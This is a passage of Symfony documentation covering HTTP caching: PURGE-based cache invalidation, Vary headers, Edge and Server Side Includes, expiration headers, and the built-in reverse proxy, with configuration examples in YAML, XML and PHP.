                    <without-attribute-sanitizer>Symfony\Component\HtmlSanitizer\Visitor\AttributeSanitizer\UrlAttributeSanitizer</without-attribute-sanitizer>
                </framework:html-sanitizer>
            </framework:config>
        </container>

    .. code-block:: php

        // config/packages/framework.php
        use App\Sanitizer\CustomAttributeSanitizer;
        use Symfony\Config\FrameworkConfig;

        return static function (FrameworkConfig $framework): void {
            $framework->htmlSanitizer()
                ->sanitizer('app.post_sanitizer')
                    ->withAttributeSanitizer(CustomAttributeSanitizer::class)

                    // you can also disable previously enabled attribute sanitizers
                    //->withoutAttributeSanitizer(CustomAttributeSanitizer::class)
            ;
        };

    .. code-block:: php-standalone

        use App\Sanitizer\CustomAttributeSanitizer;
        use Symfony\Component\HtmlSanitizer\HtmlSanitizer;
        use Symfony\Component\HtmlSanitizer\HtmlSanitizerConfig;

        $customAttributeSanitizer = new CustomAttributeSanitizer();
        $postSanitizer = new HtmlSanitizer(
            (new HtmlSanitizerConfig())
                ->withAttributeSanitizer($customAttributeSanitizer)

                // you can also disable previously enabled attribute sanitizers
                //->withoutAttributeSanitizer($customAttributeSanitizer)
        );

.. _`HTML Sanitizer W3C Standard Proposal`: https://wicg.github.io/sanitizer-api/
.. _`W3C Standard Proposal`: https://wicg.github.io/sanitizer-api/
.. _`DoS attacks`: https://en.wikipedia.org/wiki/Denial-of-service_attack
.. _http-cache-invalidation:

Cache Invalidation
~~~~~~~~~~~~~~~~~~

    "There are only two hard things in Computer Science: cache invalidation
    and naming things." -- Phil Karlton

Once a URL is cached by a gateway cache, the cache will not ask the
application for that content anymore. This allows the cache to provide fast
responses and reduces the load on your application. However, you risk
delivering outdated content. A way out of this dilemma is to use long
cache lifetimes, but to actively notify the gateway cache when content
changes. Reverse proxies usually provide a channel to receive such
notifications, typically through special HTTP requests.

.. caution::

    While cache invalidation is powerful, avoid it when possible. If you fail
    to invalidate something, outdated caches will be served for a potentially
    long time. Instead, use short cache lifetimes or use the validation model,
    and adjust your controllers to perform efficient validation checks as
    explained in :ref:`optimizing-cache-validation`.

    Furthermore, since invalidation is a topic specific to each type of reverse
    proxy, using this concept will tie you to a specific reverse proxy or need
    additional efforts to support different proxies.

Sometimes, however, you need that extra performance you can get when
explicitly invalidating. For invalidation, your application needs to detect
when content changes and tell the cache to remove the URLs which contain
that data from its cache.

.. tip::

    If you want to use cache invalidation, have a look at the
    `FOSHttpCacheBundle`_. This bundle provides services to help with various
    cache invalidation concepts and also documents the configuration for a
    couple of common caching proxies.

If one content corresponds to one URL, the ``PURGE`` model works well.
You send a request to the cache proxy with the HTTP method ``PURGE`` (using
the word "PURGE" is a convention, technically this can be any string) instead
of ``GET`` and make the cache proxy detect this and remove the data from the
cache instead of going to the application to get a response.

Here is how you can configure the :ref:`Symfony reverse proxy <symfony-gateway-cache>`
to support the ``PURGE`` HTTP method. First create a caching kernel that overrides the
:method:`Symfony\\Component\\HttpKernel\\HttpCache\\HttpCache::invalidate` method::

    // src/CacheKernel.php
    namespace App;

    use Symfony\Bundle\FrameworkBundle\HttpCache\HttpCache;
    use Symfony\Component\HttpFoundation\Request;
    use Symfony\Component\HttpFoundation\Response;
    // ...

    class CacheKernel extends HttpCache
    {
        protected function invalidate(Request $request, bool $catch = false): Response
        {
            if ('PURGE' !== $request->getMethod()) {
                return parent::invalidate($request, $catch);
            }

            if ('127.0.0.1' !== $request->getClientIp()) {
                return new Response(
                    'Invalid HTTP method',
                    Response::HTTP_BAD_REQUEST
                );
            }

            $response = new Response();
            if ($this->getStore()->purge($request->getUri())) {
                $response->setStatusCode(Response::HTTP_OK, 'Purged');
            } else {
                $response->setStatusCode(Response::HTTP_NOT_FOUND, 'Not found');
            }

            return $response;
        }
    }

Then, register the class as a service that :doc:`decorates </service_container/service_decoration>`
``http_cache``::

.. configuration-block::

    .. code-block:: php-attributes

        // src/CacheKernel.php
        namespace App;

        // ...
        use Symfony\Component\DependencyInjection\Attribute\AsDecorator;
        use Symfony\Component\DependencyInjection\Attribute\Autoconfigure;

        #[Autoconfigure(bind: ['$surrogate' => '@?esi'])]
        #[AsDecorator(decorates: 'http_cache')]
        class CacheKernel extends HttpCache
        {
            // ...
        }

    .. code-block:: yaml

        # config/services.yaml
        services:
            App\CacheKernel:
                decorates: http_cache
                arguments:
                    - '@kernel'
                    - '@http_cache.store'
                    - '@?esi'

    .. code-block:: xml

        <!-- config/services.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd"
        >
            <services>
                <service id="App\CacheKernel" decorates="http_cache">
                    <argument type="service" id="kernel"/>
                    <argument type="service" id="http_cache.store"/>
                    <argument type="service" id="esi" on-invalid="null"/>
                </service>
            </services>
        </container>

    .. code-block:: php

        // config/services.php
        namespace Symfony\Component\DependencyInjection\Loader\Configurator;

        use App\CacheKernel;

        return function (ContainerConfigurator $container): void {
            $services = $container->services();

            $services->set(CacheKernel::class)
                ->decorate('http_cache')
                ->args([
                    service('kernel'),
                    service('http_cache.store'),
                    service('esi')->nullOnInvalid(),
                ])
            ;
        };

.. danger::

    You must protect the ``PURGE`` HTTP method somehow to avoid random people
    purging your cached data.

**Purge** instructs the cache to drop a resource in *all its variants*
(according to the ``Vary`` header, see :doc:`/http_cache/cache_vary`). An alternative to purging is
**refreshing** the content. Refreshing means that the caching proxy is
instructed to discard its local cache and fetch the content again. This way,
the new content is already available in the cache. The drawback of refreshing
is that variants are not invalidated.

In many applications, the same content bit is used on various pages with
different URLs. More flexible concepts exist for those cases:

* **Banning** invalidates responses matching regular expressions on the
  URL or other criteria;
* **Cache tagging** lets you add a tag for each content used in a response
  so that you can invalidate all URLs containing a certain content.

.. _`FOSHttpCacheBundle`: https://foshttpcachebundle.readthedocs.org/
Varying the Response for HTTP Cache
===================================

So far, it's been assumed that each URI has exactly one representation of the
target resource. By default, HTTP caching is done by using the URI of the
resource as the cache key. If two people request the same URI of a cacheable
resource, the second person will receive the cached version.

Sometimes this isn't enough and different versions of the same URI need to
be cached based on one or more request header values. For instance, if you
compress pages when the client supports it, any given URI has two representations:
one when the client supports compression, and one when it does not. This
determination is done by the value of the ``Accept-Encoding`` request header.

In this case, you need the cache to store both a compressed and uncompressed
version of the response for the particular URI and return them based on the
request's ``Accept-Encoding`` value. This is done by using the ``Vary`` response
header, which is a comma-separated list of different headers whose values
trigger a different representation of the requested resource:

.. code-block:: text

    Vary: Accept-Encoding, User-Agent

.. tip::

    This particular ``Vary`` header would cache different versions of each
    resource based on the URI and the value of the ``Accept-Encoding`` and
    ``User-Agent`` request header.

Set the ``Vary`` header via the ``Response`` object methods or the ``#[Cache()]``
attribute::

.. configuration-block::

    .. code-block:: php-attributes

        // this attribute takes an array with the name of the header(s)
        // names for which the response varies
        use Symfony\Component\HttpKernel\Attribute\Cache;
        // ...

        #[Cache(vary: ['Accept-Encoding'])]
        #[Cache(vary: ['Accept-Encoding', 'User-Agent'])]
        public function index(): Response
        {
            // ...
        }

    .. code-block:: php

        // this method takes a header name or an array of header names for
        // which the response varies
        $response->setVary('Accept-Encoding');
        $response->setVary(['Accept-Encoding', 'User-Agent']);
.. _edge-side-includes:

Working with Edge Side Includes
===============================

Gateway caches are a great way to make your website perform better. But they
have one limitation: they can only cache whole pages. If your pages contain
dynamic sections, such as the user name or a shopping cart, you are out of
luck. Fortunately, Symfony provides a solution for these cases, based on a
technology called `ESI`_, or Edge Side Includes. Akamai wrote this specification
in 2001 and it allows specific parts of a page to have a different
caching strategy than the main page.

The ESI specification describes tags you can embed in your pages to communicate
with the gateway cache. Only one tag is implemented in Symfony, ``include``,
as this is the only useful one outside of Akamai context:

.. code-block:: html

    <!DOCTYPE html>
    <html>
        <body>
            <!-- ... some content -->

            <!-- Embed the content of another page here -->
            <esi:include src="http://..."/>

            <!-- ... more content -->
        </body>
    </html>

.. note::

    Notice from the example that each ESI tag requires a fully-qualified URL.
    An ESI tag represents a page fragment that can be fetched via the given
    URL.

When a request is handled, the gateway cache fetches the entire page from
its cache or requests it from the backend application. If the response contains
one or more ESI tags, these are processed in the same way. In other words,
the gateway cache either retrieves the included page fragment from its cache
or requests the page fragment from the backend application again. When all
the ESI tags have been resolved, the gateway cache merges each into the main
page and sends the final content to the client.

All of this happens transparently at the gateway cache level (i.e. outside
of your application). As you'll see, if you choose to take advantage of ESI
tags, Symfony makes the process of including them almost effortless.

.. _using-esi-in-symfony2:

Using ESI in Symfony
~~~~~~~~~~~~~~~~~~~~

First, to use ESI, be sure to enable it in your application configuration:

.. configuration-block::

    .. code-block:: yaml

        # config/packages/framework.yaml
        framework:
            # ...
            esi: true

    .. code-block:: xml

        <!-- config/packages/framework.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:framework="http://symfony.com/schema/dic/symfony"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/symfony
                https://symfony.com/schema/dic/symfony/symfony-1.0.xsd">

            <framework:config>
                <!-- ... -->
                <framework:esi enabled="true"/>
            </framework:config>
        </container>

    .. code-block:: php

        // config/packages/framework.php
        use Symfony\Config\FrameworkConfig;

        return static function (FrameworkConfig $framework): void {
            $framework->esi()
                ->enabled(true)
            ;
        };

Now, suppose you have a page that is relatively static, except for a news
ticker at the bottom of the content. With ESI, you can cache the news ticker
independently of the rest of the page::

    // src/Controller/DefaultController.php
    namespace App\Controller;

    // ...
    class DefaultController extends AbstractController
    {
        public function about(): Response
        {
            $response = $this->render('static/about.html.twig');
            $response->setPublic();
            $response->setMaxAge(600);

            return $response;
        }
    }

In this example, the response is marked as public to make the full page
cacheable for all requests with a lifetime of ten minutes.
Next, include the news ticker in the template by embedding an action.
This is done via the ``render()`` helper (for more details, see how to
:ref:`embed controllers in templates <templates-embed-controllers>`).

As the embedded content comes from another page (or controller for that
matter), Symfony uses the standard ``render`` helper to configure ESI tags:

.. code-block:: twig

    {# templates/static/about.html.twig #}

    {# you can use a controller reference #}
    {{ render_esi(controller('App\\Controller\\NewsController::latest', { 'maxPerPage': 5 })) }}

    {# ... or a URL #}
    {{ render_esi(url('latest_news', { 'maxPerPage': 5 })) }}

By using the ``esi`` renderer (via the ``render_esi()`` Twig function), you
tell Symfony that the action should be rendered as an ESI tag. You might be
wondering why you would want to use a helper instead of just writing the ESI
tag yourself. That's because using a helper makes your application work even
if there is no gateway cache installed.

.. tip::

    As you'll see below, the ``maxPerPage`` variable you pass is available
    as an argument to your controller (i.e. ``$maxPerPage``). The variables
    passed through ``render_esi`` also become part of the cache key so that
    you have unique caches for each combination of variables and values.

When using the default ``render()`` function (or setting the renderer to
``inline``), Symfony merges the included page content into the main one
before sending the response to the client. But if you use the ``esi`` renderer
(i.e. call ``render_esi()``) *and* if Symfony detects that it's talking to a
gateway cache that supports ESI, it generates an ESI include tag. But if there
is no gateway cache or if it does not support ESI, Symfony will just merge
the included page content within the main one as it would have done if you had
used ``render()``.

.. note::

    Symfony considers that a gateway cache supports ESI if its request include
    the ``Surrogate-Capability`` HTTP header and the value of that header
    contains the ``ESI/1.0`` string anywhere.

The embedded action can now specify its own caching rules entirely independently
of the main page::

.. configuration-block::

    .. code-block:: php-attributes

        // src/Controller/NewsController.php
        namespace App\Controller;

        use Symfony\Component\HttpKernel\Attribute\Cache;
        // ...

        class NewsController extends AbstractController
        {
            #[Cache(smaxage: 60)]
            public function latest(int $maxPerPage): Response
            {
                // ...
            }
        }

    .. code-block:: php

        // src/Controller/NewsController.php
        namespace App\Controller;

        // ...
        class NewsController extends AbstractController
        {
            public function latest(int $maxPerPage): Response
            {
                // ...

                // sets to public and adds some expiration
                $response->setSharedMaxAge(60);

                return $response;
            }
        }

In this example, the embedded action is cached publicly too because the contents
are the same for all requests. However, in other cases you may need to make this
response non-public and even non-cacheable, depending on your needs.

Putting all the above code together, with ESI the full page cache will be valid
for 600 seconds, but the news component cache will only last for 60 seconds.

.. _http_cache-fragments:

When using a controller reference, the ESI tag should reference the embedded
action as an accessible URL so the gateway cache can fetch it independently of
the rest of the page. Symfony takes care of generating a unique URL for any
controller reference and it is able to route them properly thanks to the
:class:`Symfony\\Component\\HttpKernel\\EventListener\\FragmentListener`
that must be enabled in your configuration:

.. configuration-block::

    .. code-block:: yaml

        # config/packages/framework.yaml
        framework:
            # ...
            fragments: { path: /_fragment }

    .. code-block:: xml

        <!-- config/packages/framework.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:framework="http://symfony.com/schema/dic/symfony"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/symfony
                https://symfony.com/schema/dic/symfony/symfony-1.0.xsd">

            <!-- ... -->
            <framework:config>
                <framework:fragment path="/_fragment"/>
            </framework:config>
        </container>

    .. code-block:: php

        // config/packages/framework.php
        use Symfony\Config\FrameworkConfig;

        return static function (FrameworkConfig $framework): void {
            // ...
            $framework->fragments()
                ->path('/_fragment')
            ;
        };

One great advantage of the ESI renderer is that you can make your application
as dynamic as needed and at the same time, hit the application as little as
possible.

.. caution::

    The fragment listener only responds to signed requests. Requests are only
    signed when using the fragment renderer and the ``render_esi`` Twig
    function.

The ``render_esi`` helper supports three other useful options:

``alt``
    Used as the ``alt`` attribute on the ESI tag, which allows you to specify an
    alternative URL to be used if the ``src`` cannot be found.

``ignore_errors``
    If set to true, an ``onerror`` attribute will be added to the ESI with a value
    of ``continue`` indicating that, in the event of a failure, the gateway cache
    will remove the ESI tag silently.

``absolute_uri``
     If set to true, an absolute URI will be generated. **default**: ``false``

.. _`ESI`: https://www.w3.org/TR/esi-lang/
.. sidebar:: Expiration and Validation

    You can use both validation and expiration within the same ``Response``.
    As expiration wins over validation, you can benefit from the best of
    both worlds. In other words, by using both expiration and validation, you
    can instruct the cache to serve the cached content, while checking back
    at some interval (the expiration) to verify that the content is still valid.

    .. tip::

        You can also define HTTP caching headers for expiration and validation by using
        annotations. See the `FrameworkExtraBundle documentation`_.

.. _`FrameworkExtraBundle documentation`: https://symfony.com/doc/current/bundles/SensioFrameworkExtraBundle/annotations/cache.html
HTTP Cache Expiration
=====================

The `expiration model`_ is the most efficient and straightforward of the two
caching models and should be used whenever possible. When a response is cached
with an expiration, the cache returns it directly without hitting the application
until the cached response expires.

The expiration model can be accomplished using one of two, nearly identical,
HTTP headers: ``Expires`` or ``Cache-Control``.

.. include:: /http_cache/_expiration-and-validation.rst.inc

Expiration with the ``Cache-Control`` Header
--------------------------------------------

Most of the time, you will use the ``Cache-Control`` header, which
is used to specify many different cache directives::

.. configuration-block::

    .. code-block:: php-attributes

        use Symfony\Component\HttpKernel\Attribute\Cache;
        // ...

        #[Cache(public: true, maxage: 600)]
        public function index(): Response
        {
            // ...
        }

    .. code-block:: php

        // sets the number of seconds after which the response
        // should no longer be considered fresh by shared caches
        $response->setPublic();
        $response->setMaxAge(600);

The ``Cache-Control`` header would take on the following format (it may have
additional directives):

.. code-block:: text

    Cache-Control: public, max-age=600

.. note::

    Using the ``setSharedMaxAge()`` method is not equivalent to using both
    ``setPublic()`` and ``setMaxAge()`` methods. According to the
    `Serving Stale Responses`_ section of RFC 7234, the ``s-maxage`` setting
    (added by ``setSharedMaxAge()`` method) prohibits a cache to use a stale
    response in ``stale-if-error`` scenarios. That's why it's recommended to use
    both ``public`` and ``max-age`` directives.

Expiration with the ``Expires`` Header
--------------------------------------

An alternative to the ``Cache-Control`` header is ``Expires``. There's no advantage
or disadvantage to either.

According to the HTTP specification, "the ``Expires`` header field gives
the date/time after which the response is considered stale." The ``Expires``
header can be set with the ``expires`` option of the ``#[Cache()]`` attribute or
the ``setExpires()`` ``Response`` method::

.. configuration-block::

    .. code-block:: php-attributes

        use Symfony\Component\HttpKernel\Attribute\Cache;
        // ...

        #[Cache(expires: '+600 seconds')]
        public function index(): Response
        {
            // ...
        }

    .. code-block:: php

        $date = new DateTime();
        $date->modify('+600 seconds');

        $response->setExpires($date);

The resulting HTTP header will look like this:

.. code-block:: text

    Expires: Thu, 01 Mar 2011 16:00:00 GMT

.. note::

    The ``expires`` option and the ``setExpires()`` method automatically convert
    the date to the GMT timezone as required by the specification.

Note that in HTTP versions before 1.1 the origin server wasn't required to
send the ``Date`` header. Consequently, the cache (e.g. the browser) might
need to rely on the local clock to evaluate the ``Expires`` header making
the lifetime calculation vulnerable to clock skew. Another limitation
of the ``Expires`` header is that the specification states that "HTTP/1.1
servers should not send ``Expires`` dates more than one year in the future."

.. note::

    According to the `Calculating Freshness Lifetime`_ section of RFC 7234,
    the ``Expires`` header value is ignored when the ``s-maxage`` or ``max-age``
    directive of the ``Cache-Control`` header is defined.

.. _`expiration model`: https://tools.ietf.org/html/rfc2616#section-13.2
.. _`Calculating Freshness Lifetime`: https://tools.ietf.org/html/rfc7234#section-4.2.1
.. _`Serving Stale Responses`: https://tools.ietf.org/html/rfc7234#section-4.2.4
.. _server-side-includes:

Working with Server Side Includes
=================================

In a similar way as :doc:`ESI (Edge Side Includes) </http_cache/esi>`,
SSI can be used to control HTTP caching on fragments of a response.
The most important difference that is SSI is known directly by most
web servers like `Apache`_, `Nginx`_ etc.

The SSI instructions are done via HTML comments:

.. code-block:: html

    <!DOCTYPE html>
    <html>
        <body>
            <!-- ... some content -->

            <!-- Embed the content of another page here -->
            <!--#include virtual="/..." -->

            <!-- ... more content -->
        </body>
    </html>

There are some other `available directives`_ but
Symfony manages only the ``#include virtual`` one.

.. danger::

    Be careful with SSI, your website may fall victim to injections.
    Please read this `OWASP article`_ first!

When the web server reads an SSI directive, it requests the given URI or gives
directly from its cache. It repeats this process until there is no more
SSI directives to handle. Then, it merges all responses into one and sends
it to the client.

.. _using-ssi-in-symfony:

Using SSI in Symfony
~~~~~~~~~~~~~~~~~~~~

First, to use SSI, be sure to enable it in your application configuration:

.. configuration-block::

    .. code-block:: yaml

        # config/packages/framework.yaml
        framework:
            ssi: { enabled: true }

    .. code-block:: xml

        <!-- config/packages/framework.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/symfony"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:framework="http://symfony.com/schema/dic/symfony"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/symfony
                https://symfony.com/schema/dic/symfony/symfony-1.0.xsd">

            <framework:config>
                <framework:ssi enabled="true"/>
            </framework:config>
        </container>

    .. code-block:: php

        // config/packages/framework.php
        use Symfony\Config\FrameworkConfig;

        return static function (FrameworkConfig $framework): void {
            $framework->ssi()
                ->enabled(true)
            ;
        };

Suppose you have a page with private content like a Profile page and you want
to cache a static GDPR content block. With SSI, you can add some expiration
on this block and keep the page private::

.. configuration-block::

    .. code-block:: php-attributes

        // src/Controller/ProfileController.php
        namespace App\Controller;

        use Symfony\Component\HttpKernel\Attribute\Cache;
        // ...

        class ProfileController extends AbstractController
        {
            public function index(): Response
            {
                // by default, responses are private
                return $this->render('profile/index.html.twig');
            }

            #[Cache(smaxage: 600)]
            public function gdpr(): Response
            {
                return $this->render('profile/gdpr.html.twig');
            }
        }

    .. code-block:: php

        // src/Controller/ProfileController.php
        namespace App\Controller;

        // ...
        class ProfileController extends AbstractController
        {
            public function index(): Response
            {
                // by default, responses are private
                return $this->render('profile/index.html.twig');
            }

            public function gdpr(): Response
            {
                $response = $this->render('profile/gdpr.html.twig');

                // sets to public and adds some expiration
                $response->setSharedMaxAge(600);

                return $response;
            }
        }

The profile index page has not public caching, but the GDPR block has
10 minutes of expiration. Let's include this block into the main one:

.. code-block:: twig

    {# templates/profile/index.html.twig #}

    {# you can use a controller reference #}
    {{ render_ssi(controller('App\\Controller\\ProfileController::gdpr')) }}

    {# ... or a path (in server's SSI configuration is common to use relative paths instead of absolute URLs) #}
    {{ render_ssi(path('profile_gdpr')) }}

The ``render_ssi`` twig helper will generate something like:

.. code-block:: html

    <!--#include virtual="/_fragment?_hash=abcdef1234&_path=_controller=App\Controller\ProfileController::gdpr" -->

``render_ssi`` ensures that SSI directive is generated only if the request
has the header requirement like ``Surrogate-Capability: device="SSI/1.0"``
(normally given by the web server).
Otherwise it will embed directly the sub-response.

.. note::

    For more information about Symfony cache fragments, take a tour on
    the :ref:`ESI documentation <http_cache-fragments>`.

.. _`Apache`: https://httpd.apache.org/docs/current/en/howto/ssi.html
.. _`Nginx`: https://nginx.org/en/docs/http/ngx_http_ssi_module.html
.. _`available directives`: https://en.wikipedia.org/wiki/Server_Side_Includes#Directives
.. _`OWASP article`: https://www.owasp.org/index.php/Server-Side_Includes_(SSI)_Injection
HTTP Cache
==========

The nature of rich web applications means that they're dynamic. No matter
how efficient your application, each request will always contain more overhead
than serving a static file. Usually, that's fine. But when you need your requests
to be lightning fast, you need HTTP caching.

Caching on the Shoulders of Giants
----------------------------------

With HTTP Caching, you cache the full output of a page (i.e. the response) and bypass
your application *entirely* on subsequent requests. Caching entire responses
isn't always possible for highly dynamic sites, or is it? With
:doc:`Edge Side Includes (ESI) </http_cache/esi>`, you can use the power of HTTP caching
on only *fragments* of your site.

The Symfony cache system is different because it relies on the simplicity
and power of the HTTP cache as defined in `RFC 7234 - Caching`_. Instead of
reinventing a caching methodology, Symfony embraces the standard that defines
basic communication on the Web. Once you understand the fundamental HTTP
validation and expiration caching models, you'll be ready to master the Symfony
cache system.

Since caching with HTTP isn't unique to Symfony, many articles already exist
on the topic. If you're new to HTTP caching, Ryan Tomayko's article
`Things Caches Do`_ is *highly* recommended. Another in-depth resource is Mark
Nottingham's `Cache Tutorial`_.

.. _gateway-caches:

Caching with a Gateway Cache
----------------------------

When caching with HTTP, the *cache* is separated from your application entirely
and sits between your application and the client making the request.

The job of the cache is to accept requests from the client and pass them
back to your application. The cache will also receive responses back from
your application and forward them on to the client. The cache is the "middle-man"
of the request-response communication between the client and your application.

Along the way, the cache will store each response that is deemed "cacheable"
(See :ref:`http-cache-introduction`). If the same resource is requested again,
the cache sends the cached response to the client, ignoring your application
entirely.

This type of cache is known as an HTTP gateway cache and many exist such
as `Varnish`_, `Squid in reverse proxy mode`_, and the Symfony reverse proxy.

.. tip::

    Gateway caches are sometimes referred to as reverse proxy caches,
    surrogate caches, or even HTTP accelerators.

.. _`symfony-gateway-cache`:
.. _symfony2-reverse-proxy:

Symfony Reverse Proxy
~~~~~~~~~~~~~~~~~~~~~

Symfony comes with a reverse proxy (i.e. gateway cache) written in PHP.
:ref:`It's not a fully-featured reverse proxy cache like Varnish <http-cache-symfony-versus-varnish>`,
but it is a great way to start.

.. tip::

    For details on setting up Varnish, see :doc:`/http_cache/varnish`.

Use the ``framework.http_cache`` option to enable the proxy for the
:ref:`prod environment <configuration-environments>`:

.. configuration-block::

    .. code-block:: yaml

        # config/packages/framework.yaml
        when@prod:
            framework:
                http_cache: true

    .. code-block:: xml

        <!-- config/packages/framework.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:framework="http://symfony.com/schema/dic/symfony"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/symfony
                https://symfony.com/schema/dic/symfony/symfony-1.0.xsd">

            <when env="prod">
              <framework:config>
                  <!-- ... -->
                  <framework:http-cache enabled="true"/>
              </framework:config>
            </when>
        </container>

    .. code-block:: php

        // config/packages/framework.php
        use Symfony\Config\FrameworkConfig;

        return static function (FrameworkConfig $framework, string $env): void {
            if ('prod' === $env) {
                $framework->httpCache()->enabled(true);
            }
        };

The kernel will immediately act as a reverse proxy: caching responses
from your application and returning them to the client.

The proxy has a sensible default configuration, but it can be
finely tuned via :ref:`a set of options <configuration-framework-http_cache>`.

When in :ref:`debug mode <debug-mode>`, Symfony automatically adds an
``X-Symfony-Cache`` header to the response. You can also use the ``trace_level``
config option and set it to either ``none``, ``short`` or ``full`` to add this
information.

``short`` will add the information for the main request only.
It's written in a concise way that makes it easy to record the
information in your server log files. For example, in Apache you can
use ``%{X-Symfony-Cache}o`` in ``LogFormat`` format statements.
This information can be used to extract general information about
cache efficiency of your routes.

.. tip::

    You can change the name of the header used for the trace
    information using the ``trace_header`` config option.

.. _http-cache-symfony-versus-varnish:

.. sidebar:: Changing from one Reverse Proxy to another

    The Symfony reverse proxy is a great tool to use when developing your
    website or when you deploy your website to a shared host where you cannot
    install anything beyond PHP code. But being written in PHP, it cannot
    be as fast as a proxy written in C.

    Fortunately, since all reverse proxies are effectively the same, you should
    be able to switch to something more robust - like Varnish - without any problems.
    See :doc:`How to use Varnish </http_cache/varnish>`

.. _http-cache-introduction:

Making your Responses HTTP Cacheable
------------------------------------

Once you've added a reverse proxy cache (e.g. like the Symfony reverse proxy or Varnish),
you're ready to cache your responses. To do that, you need to *communicate* to your
cache *which* responses are cacheable and for how long. This is done by setting HTTP
cache headers on the response.

HTTP specifies four response cache headers that you can set to enable caching:

* ``Cache-Control``
* ``Expires``
* ``ETag``
* ``Last-Modified``

These four headers are used to help cache your responses via *two* different models:

.. _http-expiration-validation:
.. _http-expiration-and-validation:

#. :ref:`Expiration Caching <http-cache-expiration-intro>`
   Used to cache your entire response for a specific amount of time (e.g. 24 hours).
   Simple, but cache invalidation is more difficult.

#. :ref:`Validation Caching <http-cache-validation-intro>`
   More complex: used to cache your response, but allows you to dynamically invalidate
   it as soon as your content changes.

.. sidebar:: Reading the HTTP Specification

    All of the HTTP headers you'll read about are *not* invented by Symfony! They're
    part of an HTTP specification that's used by sites all over the web. To dig deeper
    into HTTP Caching, check out the documents `RFC 7234 - Caching`_ and
    `RFC 7232 - Conditional Requests`_.

    As a web developer, you are strongly urged to read the specification. Its
    clarity and power - even more than fifteen years after its creation - is
    invaluable. Don't be put-off by the appearance of the spec - its contents
    are much more beautiful than its cover!

.. _http-cache-expiration-intro:

Expiration Caching
~~~~~~~~~~~~~~~~~~

The *easiest* way to cache a response is by caching it for a specific amount of time::

.. configuration-block::

    .. code-block:: php-attributes

        // src/Controller/BlogController.php
        use Symfony\Component\HttpKernel\Attribute\Cache;
        // ...

        #[Cache(public: true, maxage: 3600, mustRevalidate: true)]
        public function index(): Response
        {
            return $this->render('blog/index.html.twig', []);
        }

    .. code-block:: php

        // src/Controller/BlogController.php
        use Symfony\Component\HttpFoundation\Response;

        public function index(): Response
        {
            // somehow create a Response object, like by rendering a template
            $response = $this->render('blog/index.html.twig', []);

            // cache publicly for 3600 seconds
            $response->setPublic();
            $response->setMaxAge(3600);

            // (optional) set a custom Cache-Control directive
            $response->headers->addCacheControlDirective('must-revalidate', true);

            return $response;
        }

Thanks to this new code, your HTTP response will have the following header:

.. code-block:: text

    Cache-Control: public, maxage=3600, must-revalidate

This tells your HTTP reverse proxy to cache this response for 3600 seconds. If *anyone*
requests this URL again before 3600 seconds, your application *won't* be hit at all.
If you're using the Symfony reverse proxy, look at the ``X-Symfony-Cache`` header
for debugging information about cache hits and misses.

.. tip::

    The URI of the request is used as the cache key (unless you :doc:`vary </http_cache/cache_vary>`).

This provides great performance and is simple to use. But, cache *invalidation*
is not supported. If your content change, you'll need to wait until your cache
expires for the page to update.

.. tip::

    Actually, you *can* manually invalidate your cache, but it's not part of the
    HTTP Caching spec. See :ref:`http-cache-invalidation`.

If you need to set cache headers for many different controller actions, check out
`FOSHttpCacheBundle`_. It provides a way to define cache headers based on the URL
pattern and other request properties.

Finally, for more information about expiration caching, see :doc:`/http_cache/expiration`.

.. _http-cache-validation-intro:

Validation Caching
~~~~~~~~~~~~~~~~~~

With expiration caching, you say "cache for 3600 seconds!". But, when someone
updates cached content, you won't see that content on your site until the cache
expires.

If you need to see updated content *immediately*, you either need to
:ref:`invalidate <http-cache-invalidation>` your cache *or* use the validation
caching model.

For details, see :doc:`/http_cache/validation`.

Safe Methods: Only caching GET or HEAD requests
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

HTTP caching only works for "safe" HTTP methods (like GET and HEAD). This means
three things:

* Don't try to cache PUT or DELETE requests. It won't work and with good reason.
  These methods are meant to be used when mutating the state of your application
  (e.g. deleting a blog post). Caching them would prevent certain requests from hitting
  and mutating your application.

* POST requests are generally considered uncacheable, but `they can be cached`_
  when they include explicit freshness information. However, POST caching is not
  widely implemented, so you should avoid it if possible.

* You should *never* change the state of your application (e.g. update a blog post)
  when responding to a GET or HEAD request. If those requests are cached, future
  requests may not actually hit your server.

More Response Methods
~~~~~~~~~~~~~~~~~~~~~

The Response class provides many more methods related to the cache. Here are
the most useful ones::

    // marks the Response stale
    $response->expire();

    // forces the response to return a proper 304 response with no content
    $response->setNotModified();

Additionally, most cache-related HTTP headers can be set via the single
:method:`Symfony\\Component\\HttpFoundation\\Response::setCache` method::

    // use this method to set several cache settings in one call
    // (this example lists all the available cache settings)
    $response->setCache([
        'must_revalidate'  => false,
        'no_cache'         => false,
        'no_store'         => false,
        'no_transform'     => false,
        'public'           => true,
        'private'          => false,
        'proxy_revalidate' => false,
        'max_age'          => 600,
        's_maxage'         => 600,
        'immutable'        => true,
        'last_modified'    => new \DateTime(),
        'etag'             => 'abcdef'
    ]);

.. tip::

    All these options are also available when using the ``#[Cache()]`` attribute.
